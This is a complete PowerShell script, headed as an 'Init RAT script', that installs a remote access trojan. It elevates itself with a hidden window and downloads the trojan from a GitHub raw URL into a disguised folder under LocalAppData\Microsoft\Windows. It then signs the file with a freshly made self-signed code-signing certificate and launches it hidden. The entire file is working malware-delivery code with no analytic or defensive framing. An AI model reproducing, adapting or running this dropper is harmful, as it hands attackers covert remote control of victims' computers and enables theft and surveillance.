####################################################################################################
# Authors: github.com/NetConnectors
# Description: Init RAT script
####################################################################################################

$ProgressPreference = 'SilentlyContinue'

# Reset if env already exists
if (Test-Path "$env:LOCALAPPDATA\microsoft\Windows\giggles.ps1") {
    Remove-Item -Path "$env:LOCALAPPDATA\microsoft\Windows\giggles.ps1" -Force
}

# Make sure to run this script as an administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -ArgumentList "-File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    Exit
}

# Check if the script is running in a Windows environment
if ($env:OS -ne "Windows_NT") {
    Write-Warning "This script is designed to run on Windows only!"
    Exit
}

# Check if there is an active internet connection
if (-not (Test-Connection -Count 1 -Quiet google.com) -or -not (Test-Connection -Count 1 -Quiet bing.com)) {
    Write-Warning "Please check your internet connection and try again!"
    Exit
}

# Check if it can contact github.com
if (-not (Test-Connection -Count 1 -Quiet github.com)) {
    Write-Warning "Something's blocking the connection to github.com!`nPlease check your firewall settings and try again!"
    Exit
}

# Download the RAT to appdata\local
$Save2Path = "$env:LOCALAPPDATA\microsoft\Windows\"
$URL = "https://raw.githubusercontent.com/NetConnectors/4seShitzNGiggles/refs/heads/main/n/giggles.ps1"

# Check if the directory exists
if (-not (Test-Path -Path $Save2Path)) {
    New-Item -Path $Save2Path -ItemType Directory -Force | Out-Null
}

try {
    # Download the RAT
    Invoke-WebRequest -Uri $URL -OutFile "$Save2Path\giggles.ps1" -UseBasicParsing > $null
}
catch {
    Write-Warning "Failed to download the RAT!`nPlease check your internet connection and try again!"
    Exit
}

try {
    # Create a code signing certificate
    $Cert = New-SelfSignedCertificate -CertStoreLocation Cert:\CurrentUser\My -Subject "CN=CodeCert" -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256 -NotAfter (Get-Date).AddYears(5) -Type CodeSigningCert

    # Sign the RAT
    Set-AuthenticodeSignature -Certificate $Cert -FilePath "$Save2Path\giggles.ps1" | Out-Null

    # Start the RAT
    powershell "$Save2Path\giggles.ps1 /init" -Verb RunAs -WindowStyle Hidden | Out-Null
}
catch {
    Write-Warning "Failed to sign the RAT!`nPlease check your certificate and try again!"
    Remove-Item -Path "$Save2Path\giggles.ps1" -Force | Out-Null
}

$ProgressPreference = 'Continue'

# Exit the script
Exit